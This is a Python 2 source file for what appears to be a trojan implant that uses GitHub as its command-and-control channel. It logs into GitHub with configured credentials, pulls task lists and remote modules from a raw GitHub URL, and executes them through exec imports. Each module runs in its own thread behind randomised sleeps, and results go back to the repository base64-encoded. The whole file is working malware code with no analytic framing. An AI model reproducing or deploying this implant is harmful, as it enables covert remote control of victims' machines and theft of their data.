#!/usr/bin/env python
import sys
import json
import time
import base64
import random
import Queue
import threading
from github3 import login
from httpimp import add_remote_repo, remove_remote_repo
try:
    from urllib2 import urlopen
except ImportError:
    from urllib.request import urlopen


class Boy(object):
    _id = 'abc'
    config_url = ('https://raw.githubusercontent.com/how2how/toy/master/toy/'
                  'config/')

    def __init__(self, config):
        guser = config.pop('gu', '')
        gpass = config.pop('gp', '')
        grepo = config.pop('gr', '')
        self.base_modules = config.pop('bm', {})
        self.task_url = config.pop('tu', self.config_url)
        self.run_modules = config.pop('rm', [])
        self.cf = int(config.pop('cf', 60))
        self.task_queue = Queue.Queue()
        self.result_path = 'data/%s/' % self._id
        self.gh, self.repo, self.branch = Boy.connect(guser, gpass, grepo)
        for g in (guser, gpass, grepo):
            del g

    @staticmethod
    def connect(u, p, r, b='master'):
        gh = login(username=u, password=p)
        repo = gh.repository(u, r)
        branch = repo.branch(b)
        return gh, repo, branch

    @staticmethod
    def save_result(repo, path, data, msg='new result'):
        # remote_path = path + '%d.data' % random.randint(1000, 100000)
        repo.create_file(path, msg, base64.b64encode(data))
        return

    @staticmethod
    def get_file(url):
        try:
            data = urlopen(url).read()
        except Exception:
            data = None
        return data

    def load(module, url):
        add_remote_repo([module], url)
        exec "import %s" % module

    def unload(module, url):
        remove_remote_repo(url)
        if module in sys.modules:
            del module

    def install(self):
        for pkg, url in self.base_modules.items():
            try:
                add_remote_repo([pkg], url)
                print 'Try to import %s' % pkg
                exec "import %s" % pkg
            except Exception:
                print 'exception with %s' % pkg
                pass
        # for m in self.run_modules:
        #     try:
        #         exec "from toy.modules import %s" % m
        #         mod = 'toy.modules.%s' % m
        #         t = threading.Thread(
        #             target=self.worker, args=(mod,))
        #         t.start()
        #         time.sleep(random.randint(1, 10))
        #         # m.run()
        #     except Exception:
        #         print 'exception with %s' % m
        #         pass

    @staticmethod
    def get_config(config_url):
        config = Boy.get_file(config_url)
        if config:
            config = json.loads(config)
        else:
            config = {}
        return config

    @staticmethod
    def get_task(task_url):
        tasks = Boy.get_file(task_url)
        if tasks:
            tasks = json.loads(tasks)
            for task in tasks:
                exec "from toy.modules import %s" % task['module']
        else:
            tasks = []
        return tasks

    @staticmethod
    def enc(data):
        pass

    @staticmethod
    def dec(data):
        pass

    def worker(self, m, loop=False):
        path = self.result_path + '%d.data' % random.randint(
            1000, 100000)
        self.task_queue.put(1)
        result = sys.modules[m].run()
        self.task_queue.get()
        self.save_result(self.repo, path, result)
        if not loop:
            del sys.modules[m]
        return

    def run(self):
        self.install()
        while True:
            if self.task_queue.empty():
                tasks = self.get_task(self.task_url + self._id + '.json')
                for task in tasks:
                    print "run task %s" % task['module']
                    mod = 'toy.modules.%s' % task['module']
                    try:
                        t = threading.Thread(
                            target=self.worker, args=(mod,))
                        t.start()
                        time.sleep(random.randint(1, 10))
                    except Exception:
                        print 'run exception'
                        pass
            time.sleep(self.cf)
            # time.sleep(random.randint(1000, 10000))
